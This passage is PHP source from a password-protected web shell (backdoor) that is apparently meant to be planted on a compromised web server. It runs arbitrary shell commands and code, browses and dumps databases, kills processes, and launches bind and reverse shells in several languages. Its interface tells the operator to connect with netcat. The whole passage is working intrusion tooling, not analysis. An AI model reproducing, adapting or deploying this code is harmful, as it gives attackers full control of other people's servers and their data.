			"PHP Variables" => INFO_VARIABLES
		);
		foreach($phpinfo as $p=>$i){
			$s_result .= "<p class='notif' onclick=\"toggle('".$i."')\">".$p."</p>";
			ob_start();
			eval("phpinfo(".$i.");");
			$b = ob_get_contents();
			ob_end_clean();
			$a = strpos($b,"<body>")+6;
			$z = strpos($b,"</body>");
			$body = substr($b,$a,$z-$a);
			$body = str_replace(",",", ",$body);
			$body = str_replace("&amp;","&",$body);
			$body = str_replace(";","; ",$body);
			$s_result .= "<div class='info' id='".$i."'>".$body."</div>";
		}
	} // working with database
	elseif(isset($_REQUEST['db'])){
		// sqltype : mysql, mssql, oracle, pgsql, odbc, pdo
		$sqlhost = isset($_REQUEST['sqlhost'])? ssc($_REQUEST['sqlhost']) : "";
		$sqlport = isset($_REQUEST['sqlport'])? ssc($_REQUEST['sqlport']) : "";
		$sqluser = isset($_REQUEST['sqluser'])? ssc($_REQUEST['sqluser']) : "";
		$sqlpass = isset($_REQUEST['sqlpass'])? ssc($_REQUEST['sqlpass']) : "";
		$sqltype = isset($_REQUEST['sqltype'])? ssc($_REQUEST['sqltype']) : "";
		$show_form = true;
		$show_dbs = true;

		if(isset($_REQUEST['connect'])){
			$con = sql_connect($sqltype,$sqlhost,$sqluser,$sqlpass);
			$sqlcode = isset($_REQUEST['sqlcode']) ? ssc($_REQUEST['sqlcode']) : "";

			if($con!==false){
				$show_form = false;
				$s_result .= "<form action='".$s_self."db' method='post'>
					<input type='hidden' name='sqlhost' value='".$sqlhost."' />
					<input type='hidden' name='sqlport' value='".$sqlport."' />
					<input type='hidden' name='sqluser' value='".$sqluser."' />
					<input type='hidden' name='sqlpass' value='".$sqlpass."' />
					<input type='hidden' name='sqltype' value='".$sqltype."' />
					<input type='hidden' name='connect' value='connect' />
					<textarea id='sqlcode' name='sqlcode' class='txtarea' style='height:150px;'>".$sqlcode."</textarea>
					<p><input type='submit' name='gogo' class='inputzbut' value='Go !' style='width:120px;height:30px;' />
					&nbsp;&nbsp;Separate multiple commands with a semicolon  <span class='gaya'>[</span> ; <span class='gaya'>]</span></p>
					</form>";

				if(!empty($sqlcode)){
					$querys = explode(";",$sqlcode);
					foreach($querys as $query){
						if(trim($query) != ""){
							$hasil = sql_query($sqltype,$query,$con);
							if($hasil!=false){
								$s_result .= "<p style='padding:0;margin:6px 10px;font-weight:bold;'>".$query.";&nbsp;&nbsp;&nbsp;
								<span class='gaya'>[</span> ok <span class='gaya'>]</span></p>
								<table class='explore sortable' style='width:100%;'><tr>";
								for($i=0;$i<sql_num_fields($sqltype,$hasil);$i++)
									$s_result .= "<th>".@hss(sql_field_name($sqltype,$hasil,$i))."</th>";
								$s_result .= "</tr>";
								while($rows=sql_fetch_data($sqltype,$hasil)){
									$s_result .= "<tr>";
									foreach($rows as $r){
										if(empty($r)) $r = " ";
										$s_result .= "<td>".@hss($r)."</td>";
									}
									$s_result .= "</tr>";
								}
								$s_result .= "</table>";
							}
							else{
								$s_result .= "<p style='padding:0;margin:6px 10px;font-weight:bold;'>".$query.";&nbsp;&nbsp;&nbsp;
								<span class='gaya'>[</span> error <span class='gaya'>]</span></p>";
							}
						}
					}
				}
				else{
					if(($sqltype!='pdo') && ($sqltype!='odbc')){
						if($sqltype=='mysql') $showdb = "SHOW DATABASES";
						elseif($sqltype=='mssql') $showdb = "SELECT name FROM master..sysdatabases";
						elseif($sqltype=='pgsql') $showdb = "SELECT schema_name FROM information_schema.schemata";
						elseif($sqltype=='oracle') $showdb = "SELECT USERNAME FROM SYS.ALL_USERS ORDER BY USERNAME";
						elseif($sqltype=='sqlite3' || $sqltype=='sqlite') $showdb = "SELECT \"".$sqlhost."\"";
						else $showdb = "SHOW DATABASES";

						$hasil = sql_query($sqltype,$showdb,$con);

						if($hasil!=false) {
							while($rows_arr=sql_fetch_data($sqltype,$hasil)){
								foreach($rows_arr as $rows){
									$s_result .= "<p class='notif' onclick=\"toggle('db_".$rows."')\">".$rows."</p>";
									$s_result .= "<div class='info' id='db_".$rows."'><table class='explore'>";

									if($sqltype=='mysql') $showtbl = "SHOW TABLES FROM ".$rows;
									elseif($sqltype=='mssql') $showtbl = "SELECT name FROM ".$rows."..sysobjects WHERE xtype = 'U'";
									elseif($sqltype=='pgsql') $showtbl = "SELECT table_name FROM information_schema.tables WHERE table_schema='".$rows."'";
									elseif($sqltype=='oracle') $showtbl = "SELECT TABLE_NAME FROM SYS.ALL_TABLES WHERE OWNER='".$rows."'";
									elseif($sqltype=='sqlite3' || $sqltype=='sqlite') $showtbl = "SELECT name FROM sqlite_master WHERE type='table'";
									else $showtbl = "";

									$hasil_t = sql_query($sqltype,$showtbl,$con);
									if($hasil_t!=false) {
										while($tables_arr=sql_fetch_data($sqltype,$hasil_t)){
											foreach($tables_arr as $tables){
												if($sqltype=='mysql') $dump_tbl = "SELECT * FROM ".$rows.".".$tables." LIMIT 0,100";
												elseif($sqltype=='mssql') $dump_tbl = "SELECT TOP 100 * FROM ".$rows."..".$tables;
												elseif($sqltype=='pgsql') $dump_tbl = "SELECT * FROM ".$rows.".".$tables." LIMIT 100 OFFSET 0";
												elseif($sqltype=='oracle') $dump_tbl = "SELECT * FROM ".$rows.".".$tables." WHERE ROWNUM BETWEEN 0 AND 100;";
												elseif($sqltype=='sqlite' || $sqltype=='sqlite3') $dump_tbl = "SELECT * FROM ".$tables." LIMIT 0,100";
												else $dump_tbl = "";

												$dump_tbl_link = $s_self."db&connect=&sqlhost=".$sqlhost."&sqlport=".$sqlport."&sqluser=".$sqluser."&sqlpass=".$sqlpass."&sqltype=".$sqltype."&sqlcode=".urlencode($dump_tbl);

												$s_result .= "<tr><td onmouseup=\"return go('".addslashes($dump_tbl_link)."',event);\"><a target='_blank' href='".$dump_tbl_link."'>".$tables."</a></td></tr>";
											}
										}
									}
									$s_result .= "</table></div>";
								}
							}
						}
					}
				}
				sql_close($sqltype,$con);
			}
			else{
				$s_result .= "<p class='notif'>Unable to connect to database</p>";
				$show_form = true;
			}
		}

		if($show_form){
			// sqltype : mysql, mssql, oracle, pgsql, sqlite, sqlite3, odbc, pdo
			$sqllist = array();
			if(function_exists("mysql_connect")) $sqllist["mysql"] = "connect to MySQL <span style=\"font-size:12px;color:#999;\">- using mysql_*</span>";
			if(function_exists("mssql_connect") || function_exists("sqlsrv_connect")) $sqllist["mssql"] = "connect to MsSQL <span style=\"font-size:12px;color:#999;\">- using mssql_* or sqlsrv_*</span>";
			if(function_exists("pg_connect")) $sqllist["pgsql"] = "connect to PostgreSQL <span style=\"font-size:12px;color:#999;\">- using pg_*</span>";
			if(function_exists("oci_connect")) $sqllist["oracle"] = "connect to oracle <span style=\"font-size:12px;color:#999;\">- using oci_*</span>";
			if(function_exists("sqlite_open")) $sqllist["sqlite"] = "connect to SQLite <span style=\"font-size:12px;color:#999;\">- using sqlite_*</span>";
			if(class_exists("SQLite3")) $sqllist["sqlite3"] = "connect to SQLite3 <span style=\"font-size:12px;color:#999;\">- using class SQLite3</span>";
			if(function_exists("odbc_connect")) $sqllist["odbc"] = "connect via ODBC <span style=\"font-size:12px;color:#999;\">- using odbc_*</span>";
			if(class_exists("PDO")) $sqllist["pdo"] = "connect via PDO <span style=\"font-size:12px;color:#999;\">- using class PDO</span>";

			foreach($sqllist as $sqltype=>$sqltitle){
				if($sqltype=="odbc" || $sqltype=="pdo"){
					$s_result .= "<div class='mybox'><h2>".$sqltitle."</h2>
					<form action='".$s_self."db' method='post' />
					<table class='myboxtbl'>
					<tr><td style='width:170px;'>DSN / Connection String</td><td><input style='width:100%;' class='inputz' type='text' name='sqlhost' value='' /></td></tr>
					<tr><td>Username</td><td><input style='width:100%;' class='inputz' type='text' name='sqluser' value='' /></td></tr>
					<tr><td>Password</td><td><input style='width:100%;' class='inputz' type='password' name='sqlpass' value='' /></td></tr>
					</table>
					<input type='submit' name='connect' class='inputzbut' value='Connect !' style='width:120px;height:30px;margin:10px 2px 0 2px;' />
					<input type='hidden' name='sqltype' value='".$sqltype."' />
					</form>
					</div>";
				}
				elseif($sqltype=="sqlite" || $sqltype=="sqlite3"){
					$s_result .= "<div class='mybox'><h2>".$sqltitle."</h2>
					<form action='".$s_self."db' method='post' />
					<table class='myboxtbl'>
					<tr><td style='width:170px;'>DB File</td><td><input style='width:100%;' class='inputz' type='text' name='sqlhost' value='' /></td></tr>
					</table>
					<input type='submit' name='connect' class='inputzbut' value='Connect !' style='width:120px;height:30px;margin:10px 2px 0 2px;' />
					<input type='hidden' name='sqltype' value='".$sqltype."' />
					</form>
					</div>";
				}
				else{
					$s_result .= "<div class='mybox'><h2>".$sqltitle."</h2>
					<form action='".$s_self."db' method='post' />
					<table class='myboxtbl'>
					<tr><td style='width:170px;'>Host</td><td><input style='width:100%;' class='inputz' type='text' name='sqlhost' value='' /></td></tr>
					<tr><td>Username</td><td><input style='width:100%;' class='inputz' type='text' name='sqluser' value='' /></td></tr>
					<tr><td>Password</td><td><input style='width:100%;' class='inputz' type='password' name='sqlpass' value='' /></td></tr>
					<tr><td>Port (optional)</td><td><input style='width:100%;' class='inputz' type='text' name='sqlport' value='' /></td></tr>
					</table>
					<input type='submit' name='connect' class='inputzbut' value='Connect !' style='width:120px;height:30px;margin:10px 2px 0 2px;' />
					<input type='hidden' name='sqltype' value='".$sqltype."' />
					</form>
					</div>";
				}
			}

		}
	} // bind and reverse shell
	elseif(isset($_REQUEST['rs'])){
		//$s_server_ip = gethostbyname($_SERVER["HTTP_HOST"]);
		//$s_my_ip = $_SERVER['REMOTE_ADDR'];
		$rshost = $s_server_ip;

		$rsport = "13123";
		// resources $rs_pl $rs_py $rs_rb $rs_c $rs_win
		$rspesana = "Press &#39;  Go !  &#39; button and run &#39;  nc <i>server_ip</i> <i>port</i>  &#39; on your computer";
		$rspesanb = "Run &#39;  nc -l -v -p <i>port</i>  &#39; on your computer and press &#39;  Go !  &#39; button";

		//bind_pl bind_py bind_rb bind_c bind_win bind_php back_pl back_py back_rb back_c back_win back_php
		// resources $rs_pl $rs_py $rs_rb $rs_c $rs_win $rs_php
		$rsbind = array();
		$rsback = array();


		$rsbind["bind_php"] = "Bind Shell <span style='font-size:12px;color:#999;'>- php</span>";
		$rsback["back_php"] = "Reverse Shell <span style='font-size:12px;color:#999;'>- php</span>";

		if($s_perl){
			$rsbind["bind_pl"] = "Bind Shell <span style='font-size:12px;color:#999;'>- perl</span>";
			$rsback["back_pl"] = "Reverse Shell <span style='font-size:12px;color:#999;'>- perl</span>";
		}
		if($s_python){
			$rsbind["bind_py"] = "Bind Shell <span style='font-size:12px;color:#999;'>- python</span>";
			$rsback["back_py"] = "Reverse Shell <span style='font-size:12px;color:#999;'>- python</span>";
		}
		if($s_ruby){
			$rsbind["bind_rb"] = "Bind Shell <span style='font-size:12px;color:#999;'>- ruby</span>";
			$rsback["back_rb"] = "Reverse Shell <span style='font-size:12px;color:#999;'>- ruby</span>";
		}
		if($s_win){
			$rsbind["bind_win"] = "Bind Shell <span style='font-size:12px;color:#999;'>- windows executable</span>";
			$rsback["back_win"] = "Reverse Shell <span style='font-size:12px;color:#999;'>- windows executable</span>";
		}
		else{
			$rsbind["bind_c"] = "Bind Shell <span style='font-size:12px;color:#999;'>- c</span>";
			$rsback["back_c"] = "Reverse Shell <span style='font-size:12px;color:#999;'>- c</span>";
		}

		$rslist = array_merge($rsbind,$rsback);

		if(!is_writable($cwd)) $s_result .= "<p class='notif'>Directory ".$cwd." is not writable, please change to a writable one</p>";
		$rs_err = "";
		foreach($rslist as $rstype=>$rstitle){
			$split = explode("_",$rstype);
			if($split[0]=="bind"){
				$rspesan = $rspesana;
				$rsdisabled = "disabled='disabled'";
				$rstarget =	$s_server_ip;
				$labelip = "Server IP";
			}
			elseif($split[0]=="back"){
				$rspesan = $rspesanb;
				$rsdisabled = "";
				$rstarget =	$s_my_ip;
				$labelip = "Target IP";
			}
			if(isset($_REQUEST[$rstype])){
				if(isset($_REQUEST["rshost_".$rstype])) $rshost_ = ss($_REQUEST["rshost_".$rstype]);
				if(isset($_REQUEST["rsport_".$rstype])) $rsport_ = ss($_REQUEST["rsport_".$rstype]);

				if($split[0]=="bind") $rstarget_packed = $rsport_;
				elseif($split[0]=="back") $rstarget_packed = $rsport_." ".$rshost_;

				if($split[1]=="pl") $rscode = $rs_pl;
				elseif($split[1]=="py") $rscode = $rs_py;
				elseif($split[1]=="rb") $rscode = $rs_rb;
				elseif($split[1]=="c") $rscode = $rs_c;
				elseif($split[1]=="win") $rscode = $rs_win;
				elseif($split[1]=="php") $rscode = $rs_php;;
				$buff = rs($rstype,$rstarget_packed,$rscode);
				if($buff!="") $rs_err = "<p class='notif'>".hss($buff)."</p>";
			}
			$s_result .= "<div class='mybox'><h2>".$rstitle."</h2>
			<form action='".$s_self."rs' method='post' />
			<table class='myboxtbl'>
			<tr><td style='width:100px;'>".$labelip."</td><td><input ".$rsdisabled." style='width:100%;' class='inputz' type='text' name='rshost_".$rstype."' value='".$rstarget."' /></td></tr>
			<tr><td>Port</td><td><input style='width:100%;' class='inputz' type='text' name='rsport_".$rstype."' value='".$rsport."' /></td></tr>
			</table>
			<input type='submit' name='".$rstype."' class='inputzbut' value='Go !' style='width:120px;height:30px;margin:10px 2px 0 2px;' />
			&nbsp;&nbsp;<span>".$rspesan."</span>
			</form>
			</div>";
		}
		$s_result = $rs_err.$s_result;
	} // task manager
	elseif(isset($_REQUEST['ps'])){
		$buff = "";
		// kill process specified by pid
		if(isset($_REQUEST['pid'])){
			$p = ss($_REQUEST['pid']);
			if(function_exists("posix_kill")) $buff = (posix_kill($p,'9'))? "Process with pid ".$p." has been successfully killed":"Unable to kill process with pid ".$p;
			else{
				if(!$s_win) $buff = exe("kill -9 ".$p);
				else $buff = exe("taskkill /F /PID ".$p);
			}
		}

		if(!$s_win) $h = "ps aux";
		else $h = "tasklist /V /FO csv";
		$wcount = 11;
		$wexplode = " ";
		if($s_win) $wexplode = "\",\"";

		$res = exe($h);
		if(trim($res)=='') $s_result = "<p class='notif'>Error getting process list</p>";
		else{
			if($buff!="") $s_result = "<p class='notif'>".$buff."</p>";
			$s_result .= "<table class='explore sortable'>";
			if(!$s_win) $res = preg_replace('#\ +#',' ',$res);

			$psarr = explode("\n",$res);
			$fi = true;
			$tblcount = 0;

			$check = explode($wexplode,$psarr[0]);
			$wcount = count($check);

			foreach($psarr as $psa){
				if(trim($psa)!=''){
					if($fi){
						$fi = false;
						$psln = explode($wexplode,$psa,$wcount);
						$s_result .= "<tr><th class='sorttable_nosort'>action</th>";
						foreach($psln as $p) $s_result .= "<th>".trim(trim(strtolower($p)),"\"")."</th>";
						$s_result .= "</tr>";
					}
					else{
						$psln = explode($wexplode,$psa,$wcount);
						$s_result .= "<tr>";
						$tblcount = 0;
						foreach($psln as $p){
							if(trim($p)=="") $p = "&nbsp;";
							if($tblcount == 0){
								$s_result .= "<td style='text-align:center;'><a href='".$s_self."ps&pid=".trim(trim($psln[1]),"\"")."'>kill</a></td>
										<td style='text-align:center;'>".trim(trim($p),"\"")."</td>";
								$tblcount++;
							}
							else{
								$tblcount++;
								if($tblcount == count($psln)) $s_result .= "<td style='text-align:left;'>".trim(trim($p),"\"")."</td>";
								else $s_result .= "<td style='text-align:center;'>".trim(trim($p),"\"")."</td>";
							}
						}
						$s_result .= "</tr>";
					}
				}
			}
			$s_result .= "</table>";
		}
	}
	else{
		if(isset($_REQUEST['cmd'])){
			$cmd = ss($_REQUEST['cmd']);
			if(strlen($cmd) > 0){
				if(preg_match('#^cd(\ )+(.*)$#',$cmd,$r)){
					$nd = trim($r[2]);
					if(is_dir($nd)){
						chdir($nd);
						$cwd = cp(getcwd());
						$s_result .= showdir($cwd);
					}
					elseif(is_dir($cwd.$nd)){
						chdir($cwd.$nd);
						$cwd = cp(getcwd());
						$s_result .= showdir($cwd);
					}
					else $s_result .= "<p class='notif'>".$nd." is not a directory"."</p>";
				}
				else{
					$s_r = hss(exe($cmd));
					if($s_r != '') $s_result .= "<pre>".$s_r."</pre>";
					else $s_result .= showdir($cwd);
				}
			}
			else $s_result .= showdir($cwd);
		}
		else{
			$s_result .= showdir($cwd);
		}
	}

	// print useful info
	$s_info  = "<table class='headtbl'><tr><td>".$s_system."</td></tr>";
	$s_info .= "<tr><td>".$s_software."</td></tr>";
	$s_info .= "<tr><td>server ip : ".$s_server_ip."<span class='gaya'> | </span>your   ip : ".$s_my_ip;
	$s_info .= "<span class='gaya'> | </span> Time @ Server : ".@date("d M Y H:i:s",time());
	$s_info .= "
		</td></tr>
		<tr><td style='text-align:left;'>
			<table class='headtbls'><tr>
			<td>".trim($letters)."</td>
			<td>
			<span id='chpwd'>
			&nbsp;<a href=\"javascript:tukar('chpwd','chpwdform')\">
			<img height='16px' width='16px' src='".$s_self."favicon' alt='Change' style='vertical-align:middle;margin:6px 0;border:0;' />
			&nbsp;&nbsp;</a>".swd($cwd)."</span>
			<form action='".$s_self."' method='post' style='margin:0;padding:0;'>
			<span class='sembunyi' id='chpwdform'>
			&nbsp;<a href=\"javascript:tukar('chpwdform','chpwd');\">
			<img height='16px' width='16px' src='".$s_self."favicon' alt='Change' style='vertical-align:middle;margin:6px 0;border:0;' />
			</a>&nbsp;&nbsp;
			<input type='hidden' name='cd' class='inputz' style='width:300px;' value='".cp($cwd)."' />
			<input type='text' name='view' class='inputz' style='width:300px;' value='".$cwd."' />
			<input class='inputzbut' type='submit' name='submit' value='view file / folder' />
			</form>
			</span>
			</td></tr>
			</table>
		</td></tr>
		</table>";

	
	
}

?><!DOCTYPE html>
<html>
<head>
<title><?php echo $s_title; ?></title>
<meta name='robots' content='noindex, nofollow, noarchive'>
<link rel='SHORTCUT ICON' href='<?php echo $s_self; ?>favicon'>
<link href='http://fonts.googleapis.com/css?family=Ubuntu+Mono' rel='stylesheet' type='text/css'>
<style type='text/css'><?php echo gzinflate(base64_decode($style)); ?></style>
<script type='text/javascript' src='<?php echo $s_self; ?>sorttable'></script>
<script type='text/javascript'>
var d = document;
var hexstatus = false;
window.onload=function(){
	init();
	var textareas = d.getElementsByTagName('textarea');
	var count = textareas.length;
	for(i=0;i<count;i++){
		textareas[i].onkeydown = function(e){
			if(e.keyCode==9){
				e.preventDefault();
				var s = this.selectionStart;
				this.value = this.value.substring(0,this.selectionStart) + "\t" + this.value.substring(this.selectionEnd);
				this.selectionEnd = s+1;
			}
			else if((e.keyCode == 10 || e.keyCode == 13) && event.ctrlKey){
				this.form.submit();
			}
		}
	}
}
function init(){
	<?php if(isset($_REQUEST['cmd'])) echo "if(d.getElementById('cmd')) d.getElementById('cmd').focus();"; ?>
	<?php if(isset($_REQUEST['evalcode'])) echo "if(d.getElementById('evalcode')) d.getElementById('evalcode').focus();"; ?>
	<?php if(isset($_REQUEST['sqlcode'])) echo "if(d.getElementById('sqlcode')) d.getElementById('sqlcode').focus();"; ?>
	<?php if(isset($_REQUEST['login'])) echo "if(d.getElementById('login')) d.getElementById('login').focus();"; ?>
}
function tukar(l,b){
	if(d.getElementById(l)) d.getElementById(l).style.display = 'none';
	if(d.getElementById(b)) d.getElementById(b).style.display = 'block';
	if(d.getElementById(l + '_')) d.getElementById(l + '_').focus();
}
function toggle(b){
	if(d.getElementById(b)){
		if(d.getElementById(b).style.display == 'block') d.getElementById(b).style.display = 'none';
		else d.getElementById(b).style.display = 'block'
	}
}
function clickcmd(){
	var buff = d.getElementById('cmd');
	if(buff.value == '- shell command -') buff.value = '';
}
function download(what){
	what.form.submit();
	what.selectedIndex=0;
}
function go(t,evt){
	if(evt.which === 3 || evt.button === 2) return false;
	var u = (d.all) ? d.selection.createRange().text : d.getSelection();
	if(u && u.toString().length==0) window.location=t;
	return false;
}
function hexfix(t,ev){
	var r = d.getElementById('hex_'+t);
	var q = d.getElementById('dump_'+t);
	var curpos = getcurpos(r);

	if(ev.keyCode==13 || ev.keyCode==46 || ev.keyCode==8 || ev.keyCode==32)	return false;
	//down
	if(ev.keyCode==40){
		var s = d.getElementById('hex_'+(parseInt(t)+1));
		if(s){clearpos();s.focus();setcurpos(s,curpos,curpos);}
		return false;
	}//up
	if(ev.keyCode==38){
		var s = d.getElementById('hex_'+(parseInt(t)-1));
		if(s){clearpos();s.focus();setcurpos(s,curpos,curpos);}
		return false;
	}
}
function hexupdate(t,ev){
	var r = d.getElementById('hex_'+t);
	var s = d.getElementById('dump_'+t);
	var k = String.fromCharCode(ev.keyCode);
	var a = '0123456789ABCDEF';
	var hexs = r.value;
	var hex = hexs.replace(/\s+/ig,'');
	var curpos = getcurpos(r);

	clearpos();
	if(curpos%3!=2){
		if(a.indexOf(k)>=0 && curpos<hexs.length){
			chr = hexs.substr(curpos,1);
			before = (curpos>=1)?  hexs.substr(0,curpos):'';
			after = (curpos<hexs.length)? hexs.substr(curpos+1):'';
			r.value = before + k + after;
			setcurpos(r,curpos+1,curpos+1);
		}
	}

	if(r && s){
		var str = '';
		hexs = r.value;
		hex = hexs.replace(/\s+/ig,'');
		for(var i=0;i<hex.length;i+=2) str += String.fromCharCode(parseInt(hex.substr(i, 2), 16));

		str = str.replace(/[^\x21-\x7E]/ig,'.');
		str = str.replace('<','&lt;')
		str = str.replace('>','&gt;')

		dmppos = Math.floor(curpos/3);
		chr = str.substr(dmppos,1);
		before = (dmppos>=1)? str.substr(0,dmppos):'';
		after = (dmppos<str.length)? str.substr(dmppos+1):'';
		finalstr = before + "<span class='gaya' style='background:#000;font-weight:bold;border-bottom:1px solid #fff;border-top:1px solid #fff;'>" + chr + "</span>" + after;
		s.innerHTML = finalstr;
	}
}
function submithex(){
	if(!hexstatus){
		hexstatus=true;
		var hexstr = '';
		var counter = d.getElementById('counter').value;
		for(var i=0;i<counter;i++){
			var hex = d.getElementById('hex_'+i);
			hexstr+=hex.value;
			hex.remove();
		}
		hexstr = hexstr.replace(/\s+/g,'');
		var hexestxtarea = d.getElementById('hexestxtarea');
		hexestxtarea.innerHTML = hexstr;
		hexestxtarea.form.submit();
	}
}
function evalselect(e){
	var a = d.getElementById('additionaloption');
	var b = d.getElementById('gccoption');
	if(a){
		if(e.value=='php') a.className='sembunyi';
		else a.className='';
		if(b) gccoption.value ='';
	}
}
function getcurpos(c){
    var p = 0;
    if(d.selection){
        c.focus ();
        var Sel = d.selection.createRange();
        Sel.moveStart ('character', -c.value.length);
        p = Sel.text.length;
    }
    else if(c.selectionStart || c.selectionStart == '0')
        p = c.selectionStart;
    return p;
}
function setcurpos(c,p1,p2){
	if(c.setSelectionRange){
		c.focus();
		c.setSelectionRange(p1,p2);
	}
	else if(c.createTextRange){
		var r = c.createTextRange();
		r.collapse(true);
		r.moveStart('character', p1);
		r.moveEnd('character', p2);
		r.select();
	}
}
function clearpos(){
	var a = d.getElementsByName('hexdump');
	for(var i=0;i<a.length;i++){
		a[i].innerHTML = a[i].innerHTML.replace(/<[^>]+>/ig,'');
	}
}
function findtype(ty){
	var z = d.getElementById('type');
	if(z && (ty=='sdir')) z.selectedIndex = 1;
	else if(z && (ty=='sfile')) z.selectedIndex = 0;
}
</script>
</head>
<body>
<table id='main'><tr><td>
<?php if($s_auth){?>
	<div><span style='float:right;'><a href='<?php echo $s_self; ?>logout'>log out</a></span><table id='header'><tr><td style='width:80px;'><table><tr><td><h1><a href='<?php echo $s_self."cd=".cp(dirname(realpath($_SERVER['SCRIPT_FILENAME']))); ?>'><?php echo $s_name; ?></a></h1></td></tr><tr><td style='text-align:right;'><div class='ver'><?php echo $s_ver; ?></div></td></tr></table></td>
	<td><div class='headinfo'><?php echo $s_info; ?></div></td></tr></table>
	</div>
	<div style='clear:both;'></div>
	<div id='menu'>
		<table style='width:100%;'><tr>
		<td><a href='<?php echo $s_self; ?>' title='Explorer'><div class='menumi'>xpl</div></a></td>
		<td><a href='<?php echo $s_self; ?>ps' title='Display process status'><div class='menumi'>ps</div></a></td>
		<td><a href='<?php echo $s_self; ?>eval' title='Execute code'><div class='menumi'>eval</div></a></td>
		<td><a href='<?php echo $s_self; ?>info' title='Information about server'><div class='menumi'>info</div></a></td>
		<td><a href='<?php echo $s_self; ?>db' title='Connect to database'><div class='menumi'>db</div></a></td>
		<td><a href='<?php echo $s_self; ?>rs' title='Remote Shell'><div class='menumi'>rs</div></a></td>
		<td style='width:100%;padding:0 0 0 6px;'>
		<form action='<?php echo $s_self; ?>' method='post'><span class='prompt'><?php echo $s_prompt; ?></span>
		<input id='cmd' onclick="clickcmd();" class='inputz' type='text' name='cmd' style='width:70%;' value='<?php
if(isset($_REQUEST['cmd'])) echo "";
else echo "- shell command -";
?>' />
		<noscript><input class='inputzbut' type='submit' value='Go !' name='submitcmd' style='width:80px;' /></noscript>
		</form>
		</td>
		</tr>
		</table>
	</div>
	<div id='content' id='box_shell'>
		<div id='result'><?php echo $s_result; ?></div>
	</div><?php }
else{ ?>
	<div style='width:100%;text-align:center;'>

	<form action='<?php echo $s_self; ?>' method='post'>
	<img src='<?php echo $s_self; ?>favicon' style='margin:2px;vertical-align:middle;' />
	<?php echo $s_name; ?>&nbsp;<span class='gaya'><?php echo $s_ver; ?></span><input id='login' class='inputz' type='password' name='login' style='width:120px;' value='' />
	<input class='inputzbut' type='submit' value='Go !' name='submitlogin' style='width:80px;' />
	</form>
	</div>

<?php } ?>
</td></tr></table>
<p class='footer'>Jayalah Indonesiaku &copy;<?php echo @date("Y",time())." ".$s_name; ?></p>
</body>
</html><?php die(); ?>